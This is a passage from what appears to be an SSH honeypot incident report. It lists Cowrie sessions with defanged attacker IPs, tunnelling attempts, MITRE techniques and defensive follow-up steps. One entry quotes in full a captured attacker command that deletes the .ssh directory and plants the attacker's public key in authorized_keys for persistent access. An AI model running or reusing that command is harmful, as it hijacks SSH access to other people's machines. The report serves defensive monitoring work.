**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7193d8074bb

| Field | Detail |
|---|---|
| **Source IP** | `122.187.230[.]183` |
| **First Seen** | 2026-08-23 03:21 |
| **Last Seen** | 2026-08-23 03:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:21:33` | `cowrie.session.connect` |
| `2026-08-23 03:21:34` | `cowrie.client.version` |
| `2026-08-23 03:21:34` | `cowrie.client.kex` |
| `2026-08-23 03:21:36` | `cowrie.login.success` |
| `2026-08-23 03:21:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.230[.]183` to AbuseIPDB if not already reported
- [ ] Block `122.187.230[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c95b17ee8d82

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]244` |
| **First Seen** | 2026-08-23 03:21 |
| **Last Seen** | 2026-08-23 03:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:21:43` | `cowrie.session.connect` |
| `2026-08-23 03:21:43` | `cowrie.client.version` |
| `2026-08-23 03:21:43` | `cowrie.client.kex` |
| `2026-08-23 03:21:46` | `cowrie.login.success` |
| `2026-08-23 03:21:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:21:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]244` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05338e3b113b

| Field | Detail |
|---|---|
| **Source IP** | `111.171.127[.]190` |
| **First Seen** | 2026-08-23 03:24 |
| **Last Seen** | 2026-08-23 03:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:24:45` | `cowrie.session.connect` |
| `2026-08-23 03:24:47` | `cowrie.client.version` |
| `2026-08-23 03:24:47` | `cowrie.client.kex` |
| `2026-08-23 03:24:49` | `cowrie.login.success` |
| `2026-08-23 03:24:50` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.127[.]190` to AbuseIPDB if not already reported
- [ ] Block `111.171.127[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e12475e61057

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]192` |
| **First Seen** | 2026-08-23 03:24 |
| **Last Seen** | 2026-08-23 03:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:24:55` | `cowrie.session.connect` |
| `2026-08-23 03:24:55` | `cowrie.client.version` |
| `2026-08-23 03:24:55` | `cowrie.client.kex` |
| `2026-08-23 03:24:57` | `cowrie.login.success` |
| `2026-08-23 03:24:57` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]192` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e491a8a207c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:25 |
| **Last Seen** | 2026-08-23 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:25:36` | `cowrie.session.connect` |
| `2026-08-23 03:25:36` | `cowrie.client.version` |
| `2026-08-23 03:25:36` | `cowrie.client.kex` |
| `2026-08-23 03:25:37` | `cowrie.login.success` |
| `2026-08-23 03:25:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:25:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:25:37` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b0e49e73144

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:25 |
| **Last Seen** | 2026-08-23 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:25:40` | `cowrie.session.connect` |
| `2026-08-23 03:25:40` | `cowrie.client.version` |
| `2026-08-23 03:25:40` | `cowrie.client.kex` |
| `2026-08-23 03:25:41` | `cowrie.login.success` |
| `2026-08-23 03:25:41` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:25:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:25:41` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:25:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d742f9e4d2f

| Field | Detail |
|---|---|
| **Source IP** | `104.28.233[.]73` |
| **First Seen** | 2026-08-23 03:28 |
| **Last Seen** | 2026-08-23 03:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:28:07` | `cowrie.session.connect` |
| `2026-08-23 03:28:07` | `cowrie.client.version` |
| `2026-08-23 03:28:07` | `cowrie.client.kex` |
| `2026-08-23 03:28:08` | `cowrie.login.success` |
| `2026-08-23 03:28:08` | `cowrie.session.params` |
| `2026-08-23 03:28:08` | `cowrie.command.input` |
| `2026-08-23 03:28:08` | `cowrie.command.failed` |
| `2026-08-23 03:28:09` | `cowrie.log.closed` |
| `2026-08-23 03:28:10` | `cowrie.session.params` |
| `2026-08-23 03:28:10` | `cowrie.command.input` |
| `2026-08-23 03:28:10` | `cowrie.session.file_download` |
| `2026-08-23 03:28:10` | `cowrie.log.closed` |
| `2026-08-23 03:28:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `104.28.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dfae8d60eaa

| Field | Detail |
|---|---|
| **Source IP** | `104.28.233[.]73` |
| **First Seen** | 2026-08-23 03:28 |
| **Last Seen** | 2026-08-23 03:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:28:10` | `cowrie.session.connect` |
| `2026-08-23 03:28:10` | `cowrie.client.version` |
| `2026-08-23 03:28:10` | `cowrie.client.kex` |
| `2026-08-23 03:28:10` | `cowrie.login.success` |
| `2026-08-23 03:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `104.28.233[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6896413b6034

| Field | Detail |
|---|---|
| **Source IP** | `104.28.233[.]73` |
| **First Seen** | 2026-08-23 03:28 |
| **Last Seen** | 2026-08-23 03:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:28:12` | `cowrie.session.connect` |
| `2026-08-23 03:28:12` | `cowrie.client.version` |
| `2026-08-23 03:28:12` | `cowrie.client.kex` |
| `2026-08-23 03:28:12` | `cowrie.login.success` |
| `2026-08-23 03:28:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `104.28.233[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eef74a33d33

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-08-23 03:29 |
| **Last Seen** | 2026-08-23 03:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:29:39` | `cowrie.session.connect` |
| `2026-08-23 03:29:40` | `cowrie.client.version` |
| `2026-08-23 03:29:40` | `cowrie.client.kex` |
| `2026-08-23 03:29:42` | `cowrie.login.success` |
| `2026-08-23 03:29:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8539202f3239

| Field | Detail |
|---|---|
| **Source IP** | `61.2.44[.]54` |
| **First Seen** | 2026-08-23 03:29 |
| **Last Seen** | 2026-08-23 03:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:29:48` | `cowrie.session.connect` |
| `2026-08-23 03:29:49` | `cowrie.client.version` |
| `2026-08-23 03:29:49` | `cowrie.client.kex` |
| `2026-08-23 03:29:50` | `cowrie.login.success` |
| `2026-08-23 03:29:51` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.44[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.2.44[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9adfbe1212f9

| Field | Detail |
|---|---|
| **Source IP** | `103.61.71[.]50` |
| **First Seen** | 2026-08-23 03:34 |
| **Last Seen** | 2026-08-23 03:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:34:57` | `cowrie.session.connect` |
| `2026-08-23 03:34:58` | `cowrie.client.version` |
| `2026-08-23 03:34:58` | `cowrie.client.kex` |
| `2026-08-23 03:35:01` | `cowrie.login.success` |
| `2026-08-23 03:35:02` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.71[.]50` to AbuseIPDB if not already reported
- [ ] Block `103.61.71[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7151f506fcb

| Field | Detail |
|---|---|
| **Source IP** | `112.29.68[.]22` |
| **First Seen** | 2026-08-23 03:35 |
| **Last Seen** | 2026-08-23 03:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:35:07` | `cowrie.session.connect` |
| `2026-08-23 03:35:07` | `cowrie.client.version` |
| `2026-08-23 03:35:07` | `cowrie.client.kex` |
| `2026-08-23 03:35:09` | `cowrie.login.success` |
| `2026-08-23 03:35:10` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.29.68[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.29.68[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4198035d6a18

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:35 |
| **Last Seen** | 2026-08-23 03:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:35:13` | `cowrie.session.connect` |
| `2026-08-23 03:35:13` | `cowrie.client.version` |
| `2026-08-23 03:35:13` | `cowrie.client.kex` |
| `2026-08-23 03:35:14` | `cowrie.login.success` |
| `2026-08-23 03:35:14` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:35:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:35:14` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cb52ae1fe88

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:35 |
| **Last Seen** | 2026-08-23 03:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:35:17` | `cowrie.session.connect` |
| `2026-08-23 03:35:17` | `cowrie.client.version` |
| `2026-08-23 03:35:17` | `cowrie.client.kex` |
| `2026-08-23 03:35:18` | `cowrie.login.success` |
| `2026-08-23 03:35:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:35:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:35:18` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5771882e0fb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:44 |
| **Last Seen** | 2026-08-23 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:44:39` | `cowrie.session.connect` |
| `2026-08-23 03:44:39` | `cowrie.client.version` |
| `2026-08-23 03:44:40` | `cowrie.client.kex` |
| `2026-08-23 03:44:40` | `cowrie.login.success` |
| `2026-08-23 03:44:41` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:44:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:44:41` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2729b9f12c2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:44 |
| **Last Seen** | 2026-08-23 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:44:43` | `cowrie.session.connect` |
| `2026-08-23 03:44:43` | `cowrie.client.version` |
| `2026-08-23 03:44:44` | `cowrie.client.kex` |
| `2026-08-23 03:44:44` | `cowrie.login.success` |
| `2026-08-23 03:44:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:44:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:44:45` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc15a03d99ca

| Field | Detail |
|---|---|
| **Source IP** | `120.194.50[.]39` |
| **First Seen** | 2026-08-23 03:53 |
| **Last Seen** | 2026-08-23 03:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:53:33` | `cowrie.session.connect` |
| `2026-08-23 03:53:35` | `cowrie.client.version` |
| `2026-08-23 03:53:35` | `cowrie.client.kex` |
| `2026-08-23 03:53:37` | `cowrie.login.success` |
| `2026-08-23 03:53:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.194.50[.]39` to AbuseIPDB if not already reported
- [ ] Block `120.194.50[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1256164e913d

| Field | Detail |
|---|---|
| **Source IP** | `69.124.69[.]20` |
| **First Seen** | 2026-08-23 03:53 |
| **Last Seen** | 2026-08-23 03:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:53:42` | `cowrie.session.connect` |
| `2026-08-23 03:53:43` | `cowrie.client.version` |
| `2026-08-23 03:53:43` | `cowrie.client.kex` |
| `2026-08-23 03:53:44` | `cowrie.login.success` |
| `2026-08-23 03:53:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.124.69[.]20` to AbuseIPDB if not already reported
- [ ] Block `69.124.69[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78a95685f32e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:54 |
| **Last Seen** | 2026-08-23 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:54:09` | `cowrie.session.connect` |
| `2026-08-23 03:54:09` | `cowrie.client.version` |
| `2026-08-23 03:54:09` | `cowrie.client.kex` |
| `2026-08-23 03:54:10` | `cowrie.login.success` |
| `2026-08-23 03:54:10` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:54:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:54:10` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f548f930c826

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:54 |
| **Last Seen** | 2026-08-23 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:54:12` | `cowrie.session.connect` |
| `2026-08-23 03:54:12` | `cowrie.client.version` |
| `2026-08-23 03:54:12` | `cowrie.client.kex` |
| `2026-08-23 03:54:13` | `cowrie.login.success` |
| `2026-08-23 03:54:14` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:54:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:54:14` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62812e84239

| Field | Detail |
|---|---|
| **Source IP** | `220.180.249[.]165` |
| **First Seen** | 2026-08-23 03:57 |
| **Last Seen** | 2026-08-23 03:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:57:03` | `cowrie.session.connect` |
| `2026-08-23 03:57:04` | `cowrie.client.version` |
| `2026-08-23 03:57:04` | `cowrie.client.kex` |
| `2026-08-23 03:57:06` | `cowrie.login.success` |
| `2026-08-23 03:57:07` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `220.180.249[.]165` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f009200378

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 03:57 |
| **Last Seen** | 2026-08-23 03:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:57:52` | `cowrie.session.connect` |
| `2026-08-23 03:57:52` | `cowrie.client.version` |
| `2026-08-23 03:57:52` | `cowrie.client.kex` |
| `2026-08-23 03:57:53` | `cowrie.login.success` |
| `2026-08-23 03:57:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:57:53` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7be00790611e

| Field | Detail |
|---|---|
| **Source IP** | `85.105.255[.]56` |
| **First Seen** | 2026-08-23 04:02 |
| **Last Seen** | 2026-08-23 04:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:02:02` | `cowrie.session.connect` |
